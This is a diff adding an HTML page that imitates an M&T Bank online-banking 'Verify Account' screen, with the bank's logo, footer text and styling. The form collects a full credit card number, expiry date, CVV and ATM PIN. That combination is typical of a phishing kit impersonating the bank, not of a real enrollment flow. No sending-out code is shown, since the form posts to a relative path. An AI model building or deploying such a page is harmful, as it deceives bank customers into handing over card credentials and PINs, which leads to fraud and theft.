@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="en" class="__sticky-footer">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link href="foundation-all.css" rel="stylesheet" />
+    <link href="mtb.css" rel="stylesheet" />
+    <style>
+        /*SUGGESTED ADD FOR THE FRAMEWORK*/
+
+        .no-headerFooter>.mtb-page-header {
+            display: none;
+        }
+
+        .no-headerFooter {
+            padding-top: 1.5rem;
+        }
+    </style>
+
+    <title>Enroll in Online Banking - Verify Account | M&T Bank</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+</head>
+
+<body class="">
+
+
+
+    <header class="mtb-page-header">
+        <a class="mtb__logo" href="home-page">
+            <img class="mtb__logo" src="mtb-logo.svg" alt="M&T Bank" />
+        </a>
+
+        <a href="" class="button button__right hide js-exitButton"
+            data-ensightentag="ExitButton">
+            Exit
+        </a>
+    </header>
+    <div data-msg-code="" class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
+        <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
+    </div>
+    <div class="mtb-app-enrollment--content">
+
+
+
+
+        <form action="/Enrollment/Agreements" class="js-form js-verifyAccountForm" id="verifyAccountForm" method="post"
+            name="verifyAccountForm"> <input type="hidden" value="B" name="EnrolleeType" id="EnrolleeType" />
+            <input type="hidden" value="BusinessAccount" name="EnrollmentType" id="EnrollmentType" />
+            <input type="hidden" name="EnrolleeIdentifier" id="EnrolleeIdentifier" />
+            <input type="hidden" name="EnrolleeToken" id="EnrolleeToken" />
+            <input type="hidden" value="False" name="IsMobilePlatfom" id="IsMobilePlatfom" />
+            <input type="hidden" value="OLB:MOE:VerifyYourAccountInfo" name="TagPageName" id="TagPageName" />
+            <input type="hidden" value="False" name="SetFieldsToProtected" id="SetFieldsToProtected" />
+            <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
+                <div class="cell">
+
+
+                    <!-- page title -->
+
+                    <div class="mtb-section-header mtb-section-header--top">
+                        <p class="__top-title">
+                            Verification
+                        </p>
+                        <h1>
+                            Credit/Debit Card Information
+                        </h1>
+                        <p>
+                            Verify access to your M&T Online Banking account in just a few steps
+                        </p>
+                    </div>
+
+                </div>
+
+                <div class="cell">
+
+
+
+
+                </div>
+
+
+
+
+
+
+
+                <div class="cell">
+
+                </div>
+                <div data-parentFor="FirstName" style="align-items:center ;" class="cell js-formFieldParent "
+                    data-showFor=BusinessAccount>
+                    <img src="creditcard.png" alt="">
+                </div>
+                <div data-parentFor="CreditCard" class="cell js-formFieldParent " data-showFor=BusinessAccount>
+                    <label for="CreditCard">Credit Card</label>
+                    <input data-fcid="" value="" maxlength="20" class="js-formnputItem" data-allowPaste="True"
+                        data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder="XXXX-XXXX-XXXX-XXXX" type="tel" id="CreditCard"
+                        name="CreditCard" data-inputType="text">
+                    <p class="form-error" id=LastNameError role="alert"></p>
+                    <p class="form-help-text"></p>
+                </div>
+                <div data-parentFor="ExpiryDate" class="cell js-formFieldParent "
+                    data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount data-formatType=ssn>
+                    <label for="ExpiryDate">Expiry Date(MM)</label>
+                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="●●●-●●-●●●●">
+                        <input data-fcid="" value="" maxlength="2" data-allowPaste="True" data-allowCopy="True"
+                            data-textBoxAccepts="numbers" placeholder="02" data-inputType="tel"
+                            class="input-group-field js-canShow js-formnputItem input-group__-button-on-focus"
+                            type="tel" id="ExpiryDate" name="ExpiryDate">
+                        <div class="input-group-button">
+                            <button type="button" data-btnFor="ExpiryDate" class="button clear js-show">
+
+                            </button>
+                        </div>
+                    </div>
+                    <p class="form-error" id=ExpiryDateError role="alert"></p>
+                    <p class="form-help-text">
+
+                </div>
+                <div data-parentFor="ExpiryDate" class="cell js-formFieldParent "
+                    data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount data-formatType=ssn>
+                    <label for="ExpiryDate">Expiry Date(YY)</label>
+                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="●●●-●●-●●●●">
+                        <input data-fcid="" value="" maxlength="4" data-allowPaste="True" data-allowCopy="True"
+                            data-textBoxAccepts="numbers" placeholder="2025" data-inputType="tel"
+                            class="input-group-field js-canShow js-formnputItem input-group__-button-on-focus"
+                            type="tel" id="ExpiryDate" name="ExpiryDate">
+                        <div class="input-group-button">
+                            <button type="button" data-btnFor="ExpiryDate" class="button clear js-show">
+
+                            </button>
+                        </div>
+                    </div>
+                    <p class="form-error" id=ExpiryDateError role="alert"></p>
+                    <p class="form-help-text">
+
+                </div>
+                <div data-parentFor="CVV" class="cell js-formFieldParent "
+                    data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount data-formatType=date>
+                    <label for="CVV">CVV</label>
+                    <input data-fcid="" value="" maxlength="3" class="js-formnputItem" data-allowPaste="True"
+                        data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="***" type="password"
+                        id="CVV" name="CVV" data-inputType="password">
+                    <p class="form-error" id=CVVError role="alert"></p>
+                    <p class="form-help-text"></p>
+                </div>
+                <div data-parentFor="ATMPin" class="cell js-formFieldParent">
+                    <label for="ATMPin">ATM Pin</label>
+                    <input data-fcid="" value="" maxlength="4" class="js-formnputItem" data-allowPaste="True"
+                        data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="0000" type="password"
+                        id="ATMPin" name="ATMPin" data-inputType="text">
+                    <p class="form-error" id=ATMPinError role="alert"></p>
+                    <p class="form-help-text"></p>
+                </div>
+
+
+
+
+            </section>
+            <section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">
+
+
+                <div class="cell">
+                    <button data-ensightentag=ContinueButton type="button" data-url=""
+                        class="button button__form js-submit">
+                        Verify
+                    </button>
+                </div>
+
+            </section>
+        </form>
+
+
+
+
+
+        <footer class="mtb-footer" role="contentinfo">
+            <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
+                <div class="cell">
+                    <p>
+                        &copy;2022 M&amp;T Bank. All Rights Reserved.<br>
+                        Users of this website agree to be bound by the provisions of the M&amp;T website <a
+                            href="" target="_blank">Terms of
+                            Use</a> and <a href="" target="_blank">Privacy Policy</a>.
+                    </p>
+                    <div class="mtb-footer__logo">
+                        <a href="" target="_blank">
+                            <img src="mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender"
+                                alt="Equal Housing Lender">
+                        </a>
+                        <a href="" target="_blank">
+                            <img src="mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
+                        </a>
+                    </div>
+                    <p>
+                        Equal Housing Lender. NMLS #381076<br>
+                        <a href="" target="_blank">Member FDIC.</a>
+                    </p>
+                </div>
+            </div>
+        </footer>
+        <script src="jquery-3.3.1.js"></script>
+
+
+
+        <div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
+            <div class="mtb-spinner--triple-dot">
+                <div></div>
+                <div></div>
+                <div></div>
+                <span class="show-for-sr">Loading ...</span>
+            </div>
+        </div>
+
+</body>
+
+</html>
